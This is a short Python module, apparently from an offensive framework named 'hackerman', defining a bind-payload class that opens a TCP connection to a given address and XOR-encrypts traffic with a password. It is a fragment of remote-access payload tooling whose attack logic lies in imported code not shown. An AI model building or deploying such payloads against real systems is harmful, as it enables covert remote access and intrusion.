from hackerman.payloads.bind import base as payload
from hackerman.transport import tcp
from hackerman.crypto import xor

class Payload(payload.BasePayload):
	def __init__(self, addr, password):
		conn = tcp.Client(addr)
		crypt = xor.XORCrypt(password)
		super().__init__(conn, crypt)